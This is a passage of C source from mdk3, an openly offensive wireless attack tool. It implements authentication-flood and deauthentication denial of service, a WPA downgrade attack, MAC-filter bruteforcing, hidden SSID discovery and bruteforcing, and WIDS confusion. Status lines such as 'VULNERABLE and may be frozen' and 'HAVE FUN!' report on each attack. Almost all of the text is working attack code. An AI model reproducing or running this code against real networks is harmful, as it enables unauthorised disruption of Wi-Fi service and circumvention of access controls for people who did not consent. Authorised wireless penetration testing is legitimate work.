      eapol_state = 1;
      return retn;

    // auth
    case 1:
      // wait for answer from AP (authentication frame)
      co = 0;
      flag = 0;
      while (1) {
        co++;
        if (co > wait_max_frames) break;
        len = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);
        if (pkt_sniff[0] == 0xb0) {
          printf("\ngot authentication frame: ");
          if (! memcmp(target, pkt_sniff + 10, ETHER_ADDR_LEN) && (pkt_sniff[28] == 0x00)) {
            printf("authentication was successful\n");
            flag = 1;
            break;
          } else printf("from wrong AP or failed authentication!\n");
	}
      }  // while

      if (flag) {
        eapol_state = 2;
        return create_assoc_frame((unsigned char *) ssid, ssid_len, target, eapol_src, flag_wtype, flag_ucast, flag_mcast);
      } else {
        eapol_state = 0;
        goto retry;
      }
      break;

    // EAPOL Start
    case 2:
      co = 0;
      flag = 0;
      // wait for association response frame
      while (1) {
        co++;
        if (co > wait_max_frames) break;
        len = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);
        if (pkt_sniff[0] == 0x10) {
          printf("got association response frame: ");
          if (! memcmp(target, pkt_sniff + 10, ETHER_ADDR_LEN) && (pkt_sniff[26] == 0x00) ) {
            printf("association was successful\n");
            flag = 1;
            break;
          } else printf("from wrong AP or failed association!\n");
	}
      }  // while

      if (flag) {
        eapol_state = 3;
        goto retry;
      } else {
        // retry auth and assoc
        eapol_state = 0;
        goto retry;
      }
      break;

    case 3:
      memcpy(pkt, PKT_EAPOL_START, 36);
      memcpy(pkt + 4, target, ETHER_ADDR_LEN);
      memcpy(pkt + 10, eapol_src, ETHER_ADDR_LEN);
      memcpy(pkt + 16, target, ETHER_ADDR_LEN);
      retn.len = 36;
      retn.data = pkt;
      return retn;
    }

    // We can never reach this part of code unless somebody messes around with memory
    // But just to make gcc NOT complain...
    return retn;
}

struct pckt eapol_logoff(unsigned char *ap, unsigned char *sta)
{
  struct pckt retn;

  memcpy(pkt, PKT_EAPOL_LOGOFF, 36);
  memcpy(pkt + 4, ap, ETHER_ADDR_LEN);
  memcpy(pkt + 10, sta, ETHER_ADDR_LEN);
  memcpy(pkt + 16, ap, ETHER_ADDR_LEN);
  retn.len = 36;
  retn.data = pkt;
  return retn;
}

struct pckt intelligent_auth_dos(int random_mac)
{

    struct clist *search;
    static int oldclient_count = 0;
    static unsigned char capabilities[2];
    static unsigned char *ssid;
    static int ssid_len;
    int len = 0;
    unsigned char *fmac;

    // Client status descriptions:
    // 0 : not authed, not associated (kicked / new)
    // 1 : authed but not yet associated
    // 2 : connected (can inject data now)

    if (! init_intelligent) {
	// Building first fake client to initialize list
	if (random_mac) fmac = generate_mac(0);
	    else fmac = generate_mac(1);
	init_clist(&cl, fmac, 0, ETHER_ADDR_LEN);
	free(fmac);
	current = &cl;

	// Setting up statistics counters
	ia_stats.c_authed = 0;
	ia_stats.c_assoced = 0;
	ia_stats.c_kicked = 0;
	ia_stats.c_created = 1;	//Has been created while initialization
	ia_stats.d_captured = 0;
	ia_stats.d_sent = 0;
	ia_stats.d_responses = 0;
	ia_stats.d_relays = 0;

	// Starting the response sniffer
	pthread_t sniffer;
	pthread_create( &sniffer, NULL, (void *) intelligent_auth_sniffer, (void *) 1);

	// Sniff one beacon frame to read the capabilities of the AP
	printf("Sniffing one beacon frame to read capabilities and SSID...\n");
	while (1) {
	    len = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);
	    if (len < 36) continue;
	    if (! memcmp(pkt_sniff, "\x80", 1)) {
	        if (! memcmp(target, pkt_sniff+16, ETHER_ADDR_LEN)) {
		    //Gotcha!
		    ssid = (unsigned char *) malloc(257);
		    memcpy(capabilities, pkt_sniff+34, 2);
		    ssid_len = (int) pkt_sniff[37];
		    memcpy(ssid, pkt_sniff+38, ssid_len);
		    ssid[ssid_len] = '\x00';
		    printf("Capabilities are: %02X:%02X\n", capabilities[0], capabilities[1]);
		    printf("SSID is: %s\n", ssid);
		    break;
		}
	    }
        }

	// We are now set up
	init_intelligent = 1;
    }

    // Skip some clients for more variety
    current = current->next;
    current = current->next;

    if (oldclient_count < 30) {
	// Make sure that mdk3 doesn't waste time reauthing kicked clients or keeping things alive
	// Every 30 injected packets, it should fake another client
	oldclient_count++;

	search = search_status(current->next, 1);
	if (search != NULL) {
	    //there is an authed client that needs to be associated
	    return create_assoc_frame_simple(target, search->data, capabilities, ssid, ssid_len);
	}

	search = search_status(current->next, 2);
	if (search != NULL) {
	    //there is a fully authed client that should send some data to keep it alive
	    if (we_got_data) {
		ia_stats.d_sent++;
		return get_data_for_intelligent_auth_dos(search->data);
	    }
	}
    }

    // We reach here if there either were too many or no old clients
    search = NULL;

    // Search for a kicked client if we didn't reach our limit yet
    if (oldclient_count < 30) {
	oldclient_count++;
	search = search_status(current, 0);
    }
    // And make a new one if none is found
    if (search == NULL) {
	if (random_mac) fmac = generate_mac(0);
	    else fmac = generate_mac(1);
	search = add_to_clist(current, fmac, 0, ETHER_ADDR_LEN);
	free(fmac);
	ia_stats.c_created++;
	oldclient_count = 0;
    }

    // Authenticate the new/kicked clients
    return create_auth_frame(target, 0, search->data);
}

struct pckt wids_machine()
{
    int t;
    struct clistwidsclient *search;

    if (! init_wids) {
	// WIDS confusion initialisation

	wids_stats.aps = 0;
	wids_stats.clients = 0;
	wids_stats.cycles = 0;
	wids_stats.deauths = 0;

	printf("\nWaiting 10 seconds for initialization...\n");

	pthread_t sniffer;
	pthread_create( &sniffer, NULL, (void *) wids_sniffer, (void *) 1);

	for (t=0; t<10; t++) {
	    sleep(1);
	    printf("\rAPs found: %d   Clients found: %d", wids_stats.aps, wids_stats.clients);
	}

	while (!init_aplist) {
	    printf("\rNo APs have been found yet, waiting...\n");
	    sleep(5);
	}
	while (!init_clientlist) {
	    printf("\rNo clients found yet. If it doesn't start, maybe you need to fake additional clients with -c\n");
	    sleep(5);
	}
	init_wids = 1;
    }

    // Move forward some steps
    char rnd = random() % 13;
    for (t=0; t<rnd; t++) {
	clwc_cur = clwc_cur->next;
	clwa_cur = clwa_cur->next;
    }

    //Checking for any half open connection
    search = search_status_widsclient(clwc_cur, 1, osdep_get_channel());
    if (search != NULL) {  //Found client authed but not assoced
	if (search->retry > 10) {
	    search->status = 0;
	    search->retry = 0;
	}
	search->retry++;
//printf("\rAssociating Client: %02X:%02X:%02X:%02X:%02X:%02X on AP %02X:%02X:%02X:%02X:%02X:%02X           \n", search->mac[0], search->mac[1], search->mac[2], search->mac[3], search->mac[4], search->mac[5], search->bssid->bssid[0], search->bssid->bssid[1], search->bssid->bssid[2], search->bssid->bssid[3], search->bssid->bssid[4], search->bssid->bssid[5]);
	return create_assoc_frame_simple(search->bssid->bssid, search->mac, search->bssid->capa, essid, essid_len);
    }
    search = search_status_widsclient(clwc_cur, 2, osdep_get_channel());
    if (search != NULL) {  //Found client assoced but sent no data yet
	search->status = 0;
	wids_stats.cycles++;
	return get_data_for_wids(search);
    }

    //Chosing current client and connect him to the next AP in the list
    do {
	if (zc_exploit) { // Zero: Connecting to foreign AP
	    clwc_cur->bssid = clwa_cur->next;
	    clwa_cur = clwa_cur->next;
	} else { // ASPj: Connecting to WDS AP
	    clwc_cur->bssid = clwc_cur->bssid->next;
	}
    } while (clwc_cur->bssid->channel != osdep_get_channel());

//printf("\rConnecting Client: %02X:%02X:%02X:%02X:%02X:%02X on AP %02X:%02X:%02X:%02X:%02X:%02X           \n", clwc_cur->mac[0], clwc_cur->mac[1], clwc_cur->mac[2], clwc_cur->mac[3], clwc_cur->mac[4], clwc_cur->mac[5], clwc_cur->bssid->bssid[0], clwc_cur->bssid->bssid[1], clwc_cur->bssid->bssid[2], clwc_cur->bssid->bssid[3], clwc_cur->bssid->bssid[4], clwc_cur->bssid->bssid[5]);

    return create_auth_frame(clwc_cur->bssid->bssid, 0, clwc_cur->mac);
}

struct pckt mac_bruteforcer()
{
    struct pckt rtnpkt;
    static unsigned char *current_mac;
    int get_new_mac = 1;
    static struct timeval tv_start, tv_end, tv_diff, tv_temp, tv_temp2;
    struct timespec wait;

    if (! mac_b_init) {
	pthread_cond_init (&has_packet, NULL);
	pthread_mutex_init (&has_packet_mutex, NULL);
	pthread_mutex_unlock (&has_packet_mutex);
	pthread_cond_init (&clear_packet, NULL);
	pthread_mutex_init (&clear_packet_mutex, NULL);
	pthread_mutex_unlock (&clear_packet_mutex);

	tv_dyntimeout.tv_sec = 0;
	tv_dyntimeout.tv_usec = 100000;	//Dynamic timeout initialized with 100 ms

	pthread_t sniffer;
	pthread_create( &sniffer, NULL, (void *) mac_bruteforce_sniffer, (void *) 1);
    }

    if (mac_b_init) {
	//Wait for an answer to the last packet
	gettimeofday(&tv_temp, NULL);
	timeradd(&tv_temp, &tv_dyntimeout, &tv_temp2);
	TIMEVAL_TO_TIMESPEC(&tv_temp2, &wait);
	pthread_cond_timedwait(&has_packet, &has_packet_mutex, &wait);

	//has packet after timeout?
	if (has_packet_really) {
	    //  if yes: if this answer is positive, copy the MAC, print it and exit!
	    if (memcmp(target, pkt_sniff+4, 6)) // Filter out own packets & APs responding strangely (authing themselves)
	    if ((pkt_sniff[28] == 0x00) && (pkt_sniff[29] == 0x00)) {
		unsigned char *p = pkt_sniff;
		printf("\n\nFound a valid MAC adress: %02X:%02X:%02X:%02X:%02X:%02X\nHave a nice day! :)\n",
		       p[4], p[5], p[6], p[7], p[8], p[9]);
		exit(0);
	    }

	    //  if this is an answer to our current mac: get a new mac later
	    if (! memcmp(pkt_sniff+4, current_mac, 6)) {
		get_new_mac = 1;
		mac_brute_speed++;

		//  get this MACs check time, calculate new timeout
		gettimeofday(&tv_end, NULL);
		tvdiff(&tv_end, &tv_start, &tv_diff);

		/* #=- The magic timeout formula -=# */
		//If timeout is more than 500 ms, it sure is due to weak signal, so drop the calculation
		if ((tv_diff.tv_sec == 0) && (tv_diff.tv_usec < 500000)) {

		    //If timeout is lower, go down pretty fast (half the difference)
		    if (tv_diff.tv_usec < tv_dyntimeout.tv_usec) {
			tv_dyntimeout.tv_usec += (((tv_diff.tv_usec * 2) - tv_dyntimeout.tv_usec) / 2);
		    } else {
		    //If timeout is higher, raise only a little
			tv_dyntimeout.tv_usec += (((tv_diff.tv_usec * 4) - tv_dyntimeout.tv_usec) / 4);
		    }
		    //High timeouts due to bad signal? Don't go above 250 milliseconds!
		    //And avoid a broken timeout (less than half an ms, more than 250 ms)
		    if (tv_dyntimeout.tv_usec > 250000) tv_dyntimeout.tv_usec = 250000;
		    if (tv_dyntimeout.tv_usec <    500) tv_dyntimeout.tv_usec =    500;
		}
	    }

	    //reset has_packet, send condition clear_packet (after memcpy!)
	    has_packet_really = 0;
	    pthread_cond_signal(&clear_packet);

	// if not: dont get a new mac later!
	} else {
	    get_new_mac = 0;
	    mac_brute_timeouts++;
	}
    }

    // Get a new MAC????
    if (get_new_mac) {
	current_mac = get_next_mac();
	// Set this MACs first time mark
	gettimeofday(&tv_start, NULL);
    }
    // Create packet and send
    rtnpkt = create_auth_frame(target, 0, current_mac);

    mac_b_init = 1;

    return rtnpkt;
}

struct pckt wpa_downgrade()
{

    struct pckt rtnpkt;
    static int state = 0;
    int plen;

    rtnpkt.len = 0;
    rtnpkt.data = NULL; // A null packet we return when captured packet was useless
			// This ensures that statistics will be printed in low traffic situations

    switch (state) {
	case 0:		// 0: Waiting for a data packet from target

		//Sniff packet
		plen = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);
		if (plen < 36) return rtnpkt;
		//Is from target network?
		if (! is_from_target_ap(target, pkt_sniff))
		   return rtnpkt;
		//Is a beacon?
		if (pkt_sniff[0] == 0x80) {
		    wpad_beacons++;
		    return rtnpkt;
		}
		//Is data (or qos data)?
		if ((! (pkt_sniff[0] == 0x08)) && (! (pkt_sniff[0] == 0x88)))
		    return rtnpkt;
		//Is encrypted?
		if (! (pkt_sniff[1] & 0x40)) {
		    if ((pkt_sniff[30] == 0x88) && (pkt_sniff[31] == 0x8e)) { //802.1x Authentication!
			wpad_auth++;
		    } else {
			wpad_wep++;
		    }
		    return rtnpkt;
		}
		//Check WPA Enabled
		if ((pkt_sniff[27] & 0xFC) == 0x00) {
		    wpad_wep++;
		    return rtnpkt;
		}

		state++;

			// 0: Deauth AP -> Station
		return create_deauth_frame(get_macs_from_packet('a', pkt_sniff),
					   get_macs_from_packet('s', pkt_sniff),
					   get_macs_from_packet('b', pkt_sniff), 0);

	break;
	case 1:		// 1: Disassoc AP -> Station

		state++;

		return create_deauth_frame(get_macs_from_packet('a', pkt_sniff),
					   get_macs_from_packet('s', pkt_sniff),
					   get_macs_from_packet('b', pkt_sniff), 1);

	break;
	case 2:		// 2: Deauth Station -> AP

		state++;

		return create_deauth_frame(get_macs_from_packet('s', pkt_sniff),
					   get_macs_from_packet('a', pkt_sniff),
					   get_macs_from_packet('b', pkt_sniff), 0);

	break;
	case 3:		// 3: Disassoc Station -> AP


		//Increase cycle counter
		wpad_cycles++;
		state = 0;

		return create_deauth_frame(get_macs_from_packet('s', pkt_sniff),
					   get_macs_from_packet('a', pkt_sniff),
					   get_macs_from_packet('b', pkt_sniff), 1);

	break;
    }

    printf("BUG: WPA-Downgrade: Control reaches end unexpectedly!\n");
    return rtnpkt;

}

struct pckt renderman_discovery_tool()
{  
//1. mdk3 listens on some interface for beacons with hidden SSID
//2. it sends PROBE packets with SSIDs from a file back to the AP
//3. it waits for a response, prints the results
//4. it stores the APs MAC addr to not probe it a second time (be very nice)
  
    int len;
    unsigned char *zero_ssid = malloc(MAX_PACKET_LENGTH);
    static struct clist known;
    static int init_known = 0;
    static unsigned char *cur_ap = NULL;
    static int ssid_queue_in_use = 0;
    char *cur_ssid;
    
    memset(zero_ssid, '\x00', MAX_PACKET_LENGTH);
    if (cur_ap == NULL) {
	cur_ap = malloc(ETHER_ADDR_LEN);
	memset(cur_ap, '\x00', ETHER_ADDR_LEN);
    }
    
    if (ssid_queue_in_use) {
          cur_ssid = read_line_from_file(1); 
      if (cur_ssid == NULL) {
	ssid_queue_in_use = 0;
      } else {
	return create_probe_frame(cur_ssid, generate_mac(1), pkt_sniff+16);
      }
    }
    
    while (1) {
	while (1) {
	    len = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);
	    if (len < 40) continue;
	    if (! memcmp(pkt_sniff, "\x80", 1)) {
		if ((pkt_sniff[37] == '\x00') || (pkt_sniff[37] == '\x01')) break; // Null or one-byte length SSID => hidden
		if (! memcmp(pkt_sniff+38, zero_ssid, pkt_sniff[37])) break; // SSID consists only of \x00 => hidden
	    }
	    if (! memcmp(pkt_sniff, "\x50", 1)) {
		if (! memcmp(pkt_sniff+16, cur_ap, ETHER_ADDR_LEN)) {
		    pkt_sniff[38+pkt_sniff[37]] = '\x00';
		    printf("%s\n", pkt_sniff+38);
		    if (! init_known) {
			init_clist(&known, cur_ap, 0, ETHER_ADDR_LEN);
			init_known = 1;
		    } else {
			add_to_clist(&known, cur_ap, 0, ETHER_ADDR_LEN);
		    }
		    memset(cur_ap, '\x00', ETHER_ADDR_LEN);
		}
	      
	    }
	}

    // Is this AP already known?
	if (! init_known) break;
	if (search_data(&known, pkt_sniff+16, ETHER_ADDR_LEN) == NULL) break;
    }
    
    memcpy(cur_ap, pkt_sniff + 16, ETHER_ADDR_LEN);
    printf("\r%02X:%02X:%02X:%02X:%02X:%02X: ", cur_ap[0], cur_ap[1], cur_ap[2], cur_ap[3], cur_ap[4], cur_ap[5]);
    
    if (brute_ssid != NULL) return create_probe_frame(brute_ssid, generate_mac(1), pkt_sniff+16);

    ssid_queue_in_use = 1;
    cur_ssid = read_line_from_file(1); 
    if (cur_ssid == NULL) { 
	printf("Empty SSID file\n");
	exit(-1);
    } else {
	return create_probe_frame(cur_ssid, generate_mac(1), pkt_sniff+16);
    }
}

/* Response Checkers */

int get_array_index(int array_len, unsigned char *ap)
{
// Get index of AP in auth checker array auth[]

    int t;

    for(t=0; t<array_len; t++)
    {
	if (! memcmp(auth[t], ap, ETHER_ADDR_LEN)) return t;
    }

    return -1;
}

void check_auth(unsigned char *ap)
{
// Checking if Authentication DoS is successful

    int len = 0;
    int t, pos, resp = 0;

    for (t=0; t<5; t++) 
    {
	len = 0;
	while (len < 22) len = osdep_read_packet(pkt_check, MAX_PACKET_LENGTH);
	// Is this frame from the target?
	if (! memcmp(ap, pkt_check+16, ETHER_ADDR_LEN))
	{
	    // Is this frame an auth response?
	    if (! memcmp(pkt_check, "\xb0", 1))
	    {
		resp = 1;
		goto exiting;  //Hehe, goto forever! ;)
	    }
	}
    }

    exiting:

    pos = get_array_index(auth_count, ap);
    if (pos == -1)  // This ap isn't in our array, so we make a new entry for it
    {
	memcpy (auth[auth_count], ap, ETHER_ADDR_LEN); //Copy MAC into array
	auths[auth_count][0] = 0;	  //Set Status Flag 0
	auths[auth_count][1] = 0;	  //Init nr of responses
	auths[auth_count][2] = 0;	  //Init nr of missing responses
	pos = auth_count;                 //Set array position
	auth_count++;
	if ((unsigned int) auth_count >=
		sizeof (auths) / sizeof (auths[0]) ) {
		fprintf(stderr, "exceeded max auths[]\n");
		exit (1);
	}
    }

    // So far we have the MAC, know if the AP responded and its position in the array.
    // Checking Status and printf if anything important happened

    int status = auths[pos][0];  // Reading status out of array

    if (status == 0) //Nothing heard from AP so far
    {
	if (resp) //AP responding for the first time
	{
	    auths[pos][0] = 1; //Status 1 = responding
	    auths[pos][1]++;
	    printf("\rAP %02X:%02X:%02X:%02X:%02X:%02X is responding!           \n", ap[0], ap[1], ap[2], ap[3], ap[4], ap[5]);
	}
	return;
    }
    if (status == 1) //Ap is known to respond
    {
	if (resp) //Ap keeps responding
	{
	    auths[pos][1]++;
	    if ((auths[pos][1] % 500 == 0) && (auths[pos][1] != 0)) //AP can handle huge amount of clients, possibly invulnerable
	    {
		printf("\rAP %02X:%02X:%02X:%02X:%02X:%02X seems to be INVULNERABLE!      \n", ap[0], ap[1], ap[2], ap[3], ap[4], ap[5]);
		printf("Device is still responding with %5d clients connected!\n", auths[pos][1]);
	    }
	} else { //MISSING RESPONSE!
	    auths[pos][0] = 2; //Status: Possible candidate for success
	    auths[pos][2]++;   //Increase counter for missing response
	}
	return;
    }
    if (status == 2) //Ap stopped responding
    {
	if (resp) //False alarm, AP responding again
	{
	    auths[pos][0] = 1; //Reset Status
	    auths[pos][1]++;   //Add another response
	    auths[pos][2] = 0; //Reset missing response counter
	} else {
	    auths[pos][2]++;   //Increase missing response count
	    if (auths[pos][2] > 50) //50 responses missing => Another one bites the dust!
	    {
		auths[pos][0] = 3; //Status: successful
		printf("\rAP %02X:%02X:%02X:%02X:%02X:%02X seems to be VULNERABLE and may be frozen!\n", ap[0], ap[1], ap[2], ap[3], ap[4], ap[5]);
		printf("Needed to connect %4d clients to freeze it.\n", auths[pos][1]);
		if (auths[pos][1] < 150) printf("This is an unexpected low value, AP could still be working but is out of range.\n");
	    }
	}
	return;
    }
    if (status == 3) //AP under test
    {
	if (resp) //AP is back in action!
	{
	    auths[pos][0] = 1; //Reset Status
	    auths[pos][1] = 0;
	    auths[pos][2] = 0;
	    printf("\rAP %02X:%02X:%02X:%02X:%02X:%02X has returned to functionality!     \n", ap[0], ap[1], ap[2], ap[3], ap[4], ap[5]);
	}
	return;
    }
}

int check_probe(struct pckt mac)
{
// USING MODIFIED CODE FROM CHECK_AUTH, perhaps move into function to use by both

    int len = 0;
    int t, resp = 0;

    for (t=0; t<3; t++) 
    {
	len = 0;
	len = osdep_read_packet(pkt_check, MAX_PACKET_LENGTH);
	// Is this frame for fake probing station?
	if (! memcmp(mac.data, pkt_check+4, ETHER_ADDR_LEN))
	{
	    // Is this frame a probe response?
	    if (! memcmp(pkt_check, "\x50", 1))
	    {
		resp = 1;
		goto exiting;  //Again, goto forever! ;)
	    }
	}
    }

    exiting:
    return resp;
}

/* Statistics Printing */

void print_beacon_stats(struct pckt beacon)
{
// Print some information in beacon flood mode

    unsigned char *ssid = beacon.data+38;
    unsigned char len = beacon.data[37];
    unsigned char chan;

//Is there a 54 MBit speed byte?
    if(memcmp(&beacon.data[47+len], "\x6c", 1) == 0) {
        //There is! We need to skip 4 more bytes ahead to get to the channel byte
        memcpy(&chan, &beacon.data[50+len], 1);
    }
    else {
        memcpy(&chan, &beacon.data[46+len], 1);
   }

    unsigned char *mac = beacon.data+10;

//Removed '+1' since it always added a strange extra character to the output (?).
    ssid[len]='\x00';  // NOT GOOD! writes in original frame. Till now no copy was required. So this works

    printf("\rCurrent MAC: %02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    printf(" on Channel %2d with SSID: %s\n", chan, ssid);
}

void print_auth_stats(struct pckt authpkt)
{
// Print some information while in Authentication DoS mode

    unsigned char *ap = authpkt.data+4;
    unsigned char *fc = authpkt.data+10;

    printf("\rConnecting Client: %02X:%02X:%02X:%02X:%02X:%02X", fc[0], fc[1], fc[2], fc[3], fc[4], fc[5]);
    printf(" to target AP: %02X:%02X:%02X:%02X:%02X:%02X\n", ap[0], ap[1], ap[2], ap[3], ap[4], ap[5]);
}

void print_probe_stats(int responses, int sent)
{
    int perc;

    perc = ((responses * 100) / sent);

    printf("\rAP responded on %d of %d probes (%d percent)                  \n", responses, sent, perc);
}

void print_deauth_stats(struct pckt packet)
{
// Print some information while in Deauthentication DoS mode

    unsigned char *ap = packet.data+16;
    unsigned char *fc = packet.data+4;  //For the case AP kicks client

    //For the case client deauthing from AP
    if (! memcmp(packet.data+4, packet.data+16, ETHER_ADDR_LEN))
	fc = packet.data + 10;

    printf("\rDisconnecting between: %02X:%02X:%02X:%02X:%02X:%02X", fc[0], fc[1], fc[2], fc[3], fc[4], fc[5]);
    printf(" and: %02X:%02X:%02X:%02X:%02X:%02X", ap[0], ap[1], ap[2], ap[3], ap[4], ap[5]);

    // Display current channel, if hopper is running
    if (osdep_get_channel() == 0) {
	printf("\n");
    } else {
	printf(" on channel: %d\n", osdep_get_channel());
    }

}

void print_ssid_brute_stats(struct pckt packet)
{
    unsigned char *ssid = packet.data+26;
    packet.data[26+packet.data[25]] = '\x00';

    printf("\rTrying SSID: %s                                \n", ssid);
}

void print_intelligent_auth_dos_stats()
{
    printf("\rClients: Created: %4d   Authenticated: %4d   Associated: %4d   Got Kicked: %4d\n",
		       ia_stats.c_created, ia_stats.c_authed, ia_stats.c_assoced, ia_stats.c_kicked);
      printf("Data   : Captured: %4d   Sent: %4d   Responses: %4d   Relayed: %4d\n",
		       ia_stats.d_captured, ia_stats.d_sent, ia_stats.d_responses, ia_stats.d_relays);
}

void print_wids_stats()
{
    printf("\rAPs found: %d   Clients found: %d   Completed Auth-Cycles: %d   Caught Deauths: %d\n",
		  wids_stats.aps, wids_stats.clients, wids_stats.cycles, wids_stats.deauths);
}

void print_mac_bruteforcer_stats(struct pckt packet)
{
    unsigned char *m = packet.data+10;

    float timeout = (float) tv_dyntimeout.tv_usec / 1000.0;

    printf("\rTrying MAC %02X:%02X:%02X:%02X:%02X:%02X with %8.4f ms timeout at %3d MACs per second and %d retries\n",
	   m[0], m[1], m[2], m[3], m[4], m[5], timeout, mac_brute_speed, mac_brute_timeouts);

    mac_brute_speed = 0;
    mac_brute_timeouts = 0;
}

void print_wpa_downgrade_stats()
{
    static int wpa_old = 0, wep_old = 0, warning = 0, downgrader = 0;

    printf("\rDeauth cycles: %4d  802.1x authentication packets: %4d  WEP/Unencrypted packets: %4d  Beacons/sec: %3d\n", wpad_cycles, wpad_auth, wpad_wep, wpad_beacons);
    if (wpad_beacons == 0) {
	printf("NOTICE: Did not receive any beacons! Maybe AP has been reconfigured and/or is rebooting!\n");
    }

    if (wpa_old < wpad_cycles) {
	if (wep_old < wpad_wep) {
	    if (!warning) {
		printf("REALLY BIG WARNING!!! Seems like a client connected to your target AP leaks PLAINTEXT data while authenticating!!\n");
		warning = 1;
	    }
	}
    }

    if (wpa_old == wpad_cycles) {
	if (wep_old < wpad_wep) {
	    downgrader++;
	    if (downgrader == 10) {
		printf("WPA Downgrade Attack successful. No increasing WPA packet count detected. HAVE FUN!\n");
		downgrader = 0;
	    }
	}
    }

    wpa_old = wpad_cycles;
    wep_old = wpad_wep;
    wpad_beacons = 0;
}

void print_stats(char mode, struct pckt packet, int responses, int sent)
{
// Statistics dispatcher

    switch (mode)
    {
    case 'b':
    case 'B':
	print_beacon_stats(packet);
	break;
    case 'a':
    case 'A':
	print_auth_stats(packet);
	break;
    case 'p':
	print_probe_stats(responses, sent);
	break;
    case 'd':
	print_deauth_stats(packet);
	break;
    case 'P':
	print_ssid_brute_stats(packet);
	break;
    case 'i':
	print_intelligent_auth_dos_stats();
	break;
    case 'w':
	print_wids_stats();
	break;
    case 'f':
	print_mac_bruteforcer_stats(packet);
	break;
    case 'g':
	print_wpa_downgrade_stats();
	break;
    /*TODO*/
    }
}

/* MDK Parser, Setting up testing environment */

int mdk_parser(int argc, char *argv[])
{

    int nb_sent = 0, nb_sent_ps = 0;  // Packet counters
    char mode = '0';              // Current mode
    unsigned char *ap = NULL;             // Pointer to target APs MAC
    char check = 0;               // Flag for checking if test is successful
    struct pckt frm;              // Struct to save generated Packets
    char *ssid = NULL;            // Pointer to generated SSID
    int pps = 50;                 // Packet sending rate
    int t = 0;
    time_t t_prev;                // Struct to save time for printing stats every sec
    int total_time = 0;           // Amount of seconds the test took till now
    int chan = 1;                 // Channel for beacon flood mode
    int fchan = 0;                // Channel selected via -c option
    int wep = 0;                  // WEP bit for beacon flood mode (1=WEP, 2=WPA-TKIP 3=WPA-AES)
    int gmode = 0;                // 54g speed flag
    struct pckt mac;              // MAC Space for probe mode
    int resps = 0;                // Counting responses for probe mode
    int usespeed = 0;             // Should injection be slown down?
    int random_mac = 1;           // Use random or valid MAC?
    int ppb = 70;                 // Number of packets per burst
    int wait = 10;                // Seconds to wait between bursts
    int adhoc = 0;                // Ad-Hoc mode
    int adv = 0;                  // Use advanced FakeAP mode
    int renderman_discovery = 0;  // Activate RenderMan's discovery tool
    int got_ssid = 0;
    char *list_file = NULL;       // Filename for periodical white/blacklist processing
    t_prev = (time_t) malloc(sizeof(t_prev));

    // GCC Warning avoidance
    mac.data = NULL;
    mac.len = 0;
    frm.data = NULL;
    frm.len = 0;

    if ((argc < 3) || (strlen(argv[2]) != 1))
    {
	printf(use_head);
	return -1;
    }

    /* Parsing Options - Need to switch to optarg parser? */

    switch (argv[2][0])
    {
    case 'b':
	mode = 'b';
	usespeed = 1;
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-n")) if (argc > t+1) ssid = argv[t+1];
	    if (! strcmp(argv[t], "-f")) if (argc > t+1) {
		if (ssid_file_name == NULL) ssid_file_name = argv[t+1];
		else { printf(use_beac); return -1; }
	    }
	    if (! strcmp(argv[t], "-v")) if (argc > t+1) {
		if (ssid_file_name == NULL) { ssid_file_name = argv[t+1]; adv=1; }
		else { printf(use_beac); return -1; }
	    }
	    if (! strcmp(argv[t], "-s")) if (argc > t+1) pps = strtol(argv[t+1], (char **) NULL, 10);
	    if (! strcmp(argv[t], "-c")) if (argc > t+1) fchan = strtol(argv[t+1], (char **) NULL, 10);
	    if (! strcmp(argv[t], "-h")) mode = 'B';
	    if (! strcmp(argv[t], "-m")) random_mac = 0;
	    if (! strcmp(argv[t], "-w")) wep = 1;
	    if (! strcmp(argv[t], "-g")) gmode = 1;
	    if (! strcmp(argv[t], "-t")) wep = 2;
	    if (! strcmp(argv[t], "-a")) wep = 3;
	    if (! strcmp(argv[t], "-d")) adhoc = 1;
	}
	break;
    case 'a':
	mode = 'a';
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-a")) {
		  if (! argc > t+1) { printf(use_auth); return -1; }
		  ap = parse_mac(argv[t+1]);
		  mode = 'A';
	    }
        if (! strcmp(argv[t], "-i")) {
		  if (! argc > t+1) { printf(use_auth); return -1; }
		  target = parse_mac(argv[t+1]);
		  mode = 'i';
		  usespeed = 1; pps = 500;
	    }
	    if (! strcmp(argv[t], "-c")) check = 1;
	    if (! strcmp(argv[t], "-m")) random_mac = 0;
	    if (! strcmp(argv[t], "-s")) if (argc > t+1) {
		pps = strtol(argv[t+1], (char **) NULL, 10);
		usespeed = 1;
	    }
	}
	break;
    case 'p':
	mode = 'p';
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-b"))
	    {
		if(argc<=7){
	   		printf("\nYou have to specify at least:\n \
			\r a channel (-c), a target-mac (-t) and a character-set:\n \
			\r all printable (a)\n \
			\r lower case (l)\n \
			\r upper case (u)\n \
			\r numbers (n)\n \
			\r lower and upper case (c)\n \
			\r lower and upper plus numbers (m)\n \
			\noptional:\n proceed with SSID (-p <SSID>)\n packets per second (-s)\n");
	   printf("\ne.g. : mdk3 ath0 p -b a -p SSID -c 2 -t 00:11:22:33:44:55 -s 1\n\n");
	   return -1;
        }
		real_brute = 1;
		mode = 'P';
		if (argc > t) brute_mode = argv[t+1][0];
		printf("\nSSID Bruteforce Mode activated!\n");
		brute_ssid = (char*) malloc (256 * sizeof(char));
		memset(brute_ssid, 0, (256 * sizeof(char)));
		
	    }
	    if (!strcmp(argv[t], "-p")) {
		    brute_ssid = argv[t+1];
		    printf("\nproceed with: %s",brute_ssid );
		    brute_ssid[0]--;
		}
	    if (! strcmp(argv[t], "-c")){
                if (argc > t+1){ 
		    printf("\n\nchannel set to: %d", atoi(argv[t+1]));
		    osdep_set_channel(atoi(argv[t+1]));
		    }
            }
	    if (! strcmp(argv[t], "-e")) if (argc > t+1) ssid = argv[t+1];
	    if (! strcmp(argv[t], "-f")) if (argc > t+1) {
		ssid_file_name = argv[t+1];
		mode = 'P';
		printf("\nSSID Wordlist Mode activated!\n");
	    }
	    if (! strcmp(argv[t], "-t")) {
		if (! argc > t+1) { printf(use_prob); return -1; }
